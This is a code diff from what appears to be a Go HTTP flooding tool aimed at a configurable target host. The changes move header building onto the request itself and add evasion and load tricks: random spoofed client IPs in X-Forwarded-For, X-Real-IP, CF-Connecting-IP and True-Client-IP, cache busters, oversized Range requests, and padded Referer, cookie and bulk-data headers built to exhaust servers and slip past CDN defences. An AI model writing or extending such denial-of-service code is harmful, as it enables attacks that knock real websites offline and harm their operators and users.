-						headerMap := make(map[string]string)
+						req.Header.Set("User-Agent", prof.UA)
+						req.Header.Set("Accept", prof.Accept)
+						req.Header.Set("Accept-Language", prof.Lang)
+						req.Header.Set("Accept-Encoding", prof.Encoding)
+						req.Header.Set("Connection", "keep-alive")
+						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+						req.Header.Set("Pragma", "no-cache")
+						req.Header.Set("Expires", "0")
 
-						headerMap["User-Agent"] = prof.UA
-						headerMap["Accept"] = prof.Accept
-						headerMap["Accept-Language"] = prof.Lang
-						headerMap["Accept-Encoding"] = prof.Encoding
-						headerMap["Connection"] = "keep-alive"
-						headerMap["Cache-Control"] = "no-cache, no-store, must-revalidate"
-						headerMap["Pragma"] = "no-cache"
-						headerMap["Expires"] = "0"
-
+						req.Header.Set("Upgrade-Insecure-Requests", "1")
+						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", subRng.Int63()))
 						if subRng.Intn(2) == 0 {
-							past := time.Now().Add(-time.Duration(subRng.Intn(86400*365)) * time.Second).Format(time.RFC1123)
-							headerMap["If-Modified-Since"] = past
+							req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
+						}
+						if subRng.Intn(3) == 0 {
+							req.Header.Set("X-Original-URL", "/"+RST(subRng, 20))
+						}
+						if subRng.Intn(3) == 0 {
+							req.Header.Set("X-Forwarded-Host", targetHost)
 						}
 						if subRng.Intn(2) == 0 {
-							headerMap["If-None-Match"] = `"` + RST(subRng, 32) + `"`
+							req.Header.Set("X-Request-ID", strconv.FormatInt(subRng.Int63(), 16))
+						}
+						if subRng.Intn(3) == 0 {
+							req.Header.Set("X-Real-IP", RIP())
+						}
+						if subRng.Intn(5) == 0 {
+							req.Header.Set("CF-Connecting-IP", RIP())
+						}
+						if subRng.Intn(5) == 0 {
+							req.Header.Set("CDN-Loop", "cloudflare")
+						}
+						if subRng.Intn(3) == 0 {
+							req.Header.Set("True-Client-IP", RIP())
+						}
+						if subRng.Intn(5) == 0 {
+							req.Header.Set("X-Forwarded-Proto", "https")
+						}
+						if subRng.Intn(5) == 0 {
+							req.Header.Set("X-Forwarded-Port", "443")
 						}
 
 						ref := prof.Refs[subRng.Intn(len(prof.Refs))]
 						ref += RST(subRng, 20) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
-						headerMap["Referer"] = ref
+						req.Header.Set("Referer", ref)
 
 						if cli.ip != "" {
-							headerMap["X-Forwarded-For"] = cli.ip
-							headerMap["X-Real-IP"] = cli.ip
+							req.Header.Set("X-Forwarded-For", cli.ip)
+						} else {
+							req.Header.Set("X-Forwarded-For", RIP())
 						}
 
 						start := subRng.Intn(10000)
 						end := start + 10000000 + subRng.Intn(50000000)
-						headerMap["Range"] = fmt.Sprintf("bytes=%d-%d", start, end)
+						req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", start, end))
 						if subRng.Intn(2) == 0 {
-							headerMap["If-Range"] = `"` + RST(subRng, 20) + `"`
+							req.Header.Set("If-Range", `"`+RST(subRng, 20)+`"`)
 						} else {
 							past := time.Now().Add(-time.Duration(subRng.Intn(86400)) * time.Second).Format(time.RFC1123)
-							headerMap["If-Range"] = past
+							req.Header.Set("If-Range", past)
 						}
-
-						size := 4096 + subRng.Intn(4096)
-						headerMap["X-Large-Data"] = strings.Repeat("x", size)
 
 						cookieParts := []string{"big=" + strings.Repeat("x", 2048+subRng.Intn(2048))}
 						if customCookie != "" {
@@ -653,30 +412,23 @@ func main() {
 							}
 						}
 						if len(cookieParts) > 0 {
-							headerMap["Cookie"] = strings.Join(cookieParts, "; ")
+							req.Header.Set("Cookie", strings.Join(cookieParts, "; "))
 						}
 
 						if prof.SecChUa != "" {
-							headerMap["Sec-Ch-Ua"] = prof.SecChUa
-							headerMap["Sec-Ch-Ua-Mobile"] = prof.SecChUaMov
-							headerMap["Sec-Ch-Ua-Platform"] = prof.SecChUaPlat
+							req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
+							req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
+							req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
 						}
-						headerMap["Sec-Fetch-Site"] = "none"
-						headerMap["Sec-Fetch-Mode"] = "navigate"
-						headerMap["Sec-Fetch-Dest"] = "document"
+						req.Header.Set("Sec-Fetch-Site", "none")
+						req.Header.Set("Sec-Fetch-Mode", "navigate")
+						req.Header.Set("Sec-Fetch-Dest", "document")
 
 						if subRng.Intn(2) == 0 {
-							headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
+							req.Header.Set("X-Large-Data", strings.Repeat("x", 4096+subRng.Intn(4096)))
 						}
 						if subRng.Intn(3) == 0 {
-							headerMap["X-Original-URL"] = "/" + RST(subRng, 20)
-						}
-						if subRng.Intn(3) == 0 {
-							headerMap["X-Forwarded-Host"] = targetHost
-						}
-
-						for k, v := range headerMap {
-							req.Header.Set(k, v)
+							req.Header.Set("X-Bulk-Data", strings.Repeat("x", 8192+subRng.Intn(8192)))
 						}
 
 						resp, err := cli.client.Do(req)
